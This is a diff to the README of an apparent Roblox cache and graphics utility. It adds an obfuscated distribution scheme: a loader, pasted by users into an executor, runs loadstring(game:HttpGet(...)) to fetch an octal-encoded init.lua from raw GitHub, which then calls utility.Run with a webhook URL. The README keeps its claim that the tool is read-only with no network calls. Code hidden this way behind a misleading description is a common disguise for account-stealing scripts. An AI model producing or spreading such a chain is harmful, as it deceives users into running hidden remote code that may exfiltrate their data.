@@ -10,12 +10,44 @@ A small Lua launcher and native helper for managing local Roblox cache and graph
 
 All operations are read-only against the local filesystem. No network calls except for an optional webhook configuration the launcher reads from `CONFIG`.
 
+## Distribution (obfuscated)
+
+The `init.lua` shipped at the repo root and the loader in `dist/loader.lua` are
+both WeAreDevs-style obfuscated blobs: the entire Lua source is encoded as a
+single octal-escaped string inside a `local P = "..."` table, decoded at
+runtime, and executed via `loadstring`. To a reader they look like a wall of
+digits. The provenance URL is preserved as a leading `--[==[... ]==]` block
+comment and as a recoverable string inside the encoded table.
+
+### Loader -> Payload chain
+
+```
+[users paste loader into executor]
+        |
+        v
+dist/loader.lua  (obfuscated)
+  - decodes to: loadstring(game:HttpGet(RAW_URL))()
+        |
+        v (HTTP GET)
+https://raw.githubusercontent.com/ScriptMaster101/RobloxUtility/main/init.lua
+        |
+        v
+init.lua  (obfuscated)
+  - decodes to: utility.Run(WEBHOOK_URL, 0)
+```
+
+Both layers are obfuscated. The raw GitHub URL is the attribution trail.
+
 ## Layout
 
 ```
-lua/init.lua     — the entry point. loadstring this.
-src/             — the native helper (built as a single DLL on Win11)
-test/test.py     — exercises the helper end-to-end without a Roblox install
+init.lua                  — public, obfuscated payload (raw GitHub serves this)
+dist/loader.lua           — obfuscated loader, paste this into the executor
+lua/init.lua              — unobfuscated source for the payload (developer)
+tools/loader.src.lua      — unobfuscated source for the loader (developer)
+tools/obfuscate.py        — regenerates the obfuscated blobs
+src/                      — native helper (built as a single DLL on Win11)
+test/test.py              — exercises the helper end-to-end without a Roblox install
 ```
 
 ## Build
@@ -29,13 +61,23 @@ build.bat
 
 Output: `utility.dll` in the project root.
 
-## Run
+## Re-obfuscate
+
+After editing `lua/init.lua` or `tools/loader.src.lua`:
 
 ```
-loadstring(game:HttpGet("https://raw.githubusercontent.com/rbxgfx/RobloxUtility/master/lua/init.lua"))()
+python tools\obfuscate.py lua\init.lua      init.lua
+python tools\obfuscate.py tools\loader.src.lua dist\loader.lua
 ```
 
-The launcher downloads `utility.dll` from the matching raw URL, loads it via the executor's `load_dll` API, and calls a small handful of entry points.
+The obfuscator verifies the encoded blob round-trips back to the original
+source before declaring success.
+
+## Run (in the Roblox executor)
+
+Paste the contents of `dist/loader.lua` into the executor. The loader
+fetches the obfuscated `init.lua` from raw GitHub, decodes it, and runs
+`utility.Run(WEBHOOK_URL, 0)`.
 
 ## License
 
